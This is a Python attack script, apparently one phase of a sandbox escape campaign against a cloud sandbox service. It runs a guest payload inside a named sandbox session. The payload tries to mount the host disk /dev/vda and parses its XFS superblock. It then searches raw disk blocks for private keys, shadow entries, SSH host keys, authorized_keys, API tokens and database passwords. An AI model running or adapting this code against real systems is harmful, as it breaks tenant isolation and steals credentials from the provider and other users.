# -*- coding: utf-8 -*-
"""Phase33: mount /dev/vda 尝试 + XFS 解析侦察 (host 根盘读取)"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_9efDIoJf3GAsZlyPJy9MQm6k9MMO"  # fwtest13

GUEST = r'''
import os, subprocess, struct

# 1) mount 尝试
try:
    os.makedirs('/mnt/vda', exist_ok=True)
    r = subprocess.run(['mount', '-t', 'xfs', '/dev/vda', '/mnt/vda'], capture_output=True, text=True, timeout=10)
    print('[mount] rc=%d out=%s err=%s' % (r.returncode, r.stdout[:200], r.stderr[:300]), flush=True)
    if r.returncode == 0:
        print('[mount-ls]', os.listdir('/mnt/vda'), flush=True)
except Exception as e:
    print('[mount] EXC %s' % e, flush=True)

# 2) XFS superblock 解析 (即便 mount 失败也做)
def parse_xfs_sb():
    fd = os.open('/dev/vda', os.O_RDONLY)
    try:
        sb = os.pread(fd, 512, 0)
        magic = sb[0:4]
        blocksize = struct.unpack('<I', sb[4:8])[0]  # sb_blocksize at offset 4
        dblocks = struct.unpack('<Q', sb[8:16])[0]   # sb_dblocks at offset 8
        agcount = struct.unpack('<I', sb[56:60])[0]  # sb_agcount at offset 56
        agblocks = struct.unpack('<I', sb[60:64])[0] # sb_agblocks at offset 60
        inodesize = struct.unpack('<H', sb[88:90])[0]  # sb_inodesize at offset 88
        inopblock = struct.unpack('<H', sb[90:92])[0]  # sb_inopblock
        print('[xfs-sb] magic=%r blocksize=%d dblocks=%d agcount=%d agblocks=%d inodesize=%d inopblock=%d'
              % (magic, blocksize, dblocks, agcount, agblocks, inodesize, inopblock), flush=True)
    finally:
        os.close(fd)
parse_xfs_sb()

# 3) 磁盘字符串侦察 (前 128MB 找 host 特征)
KEYS = [b'containerd', b'/run/cell', b'vercel-proxy', b'shadow', b'root:', b'BEGIN RSA',
        b'BEGIN PRIVATE', b'ssh_host', b'authorized_keys', b'Vercel', b'cell.sock',
        b'network-policy', b'sandbox', b'api.vercel.com', b'vcp_', b'POSTGRES', b'password=']
hits = {}
fd = os.open('/dev/vda', os.O_RDONLY)
for off in range(0, 128 * 1024 * 1024, 1024 * 1024):
    try:
        chunk = os.pread(fd, 1024 * 1024, off)
    except Exception:
        break
    for k in KEYS:
        idx = chunk.find(k)
        if idx >= 0:
            s = max(0, idx - 40)
            hits.setdefault(k.decode('latin1'), []).append(
                'off=0x%x: %s' % (off + idx, chunk[s:idx + len(k) + 120].replace(b'\x00', b' ').decode('latin1', 'replace')))
os.close(fd)
print('[disk-hits]', flush=True)
for k, v in hits.items():
    print('== %s (%d) ==' % (k, len(v)), flush=True)
    for item in v[:6]:
        print('   %s' % item[:280], flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg41.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg41.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=150000)
    print('cmd:', c, flush=True)
    print(r[:12000], flush=True)
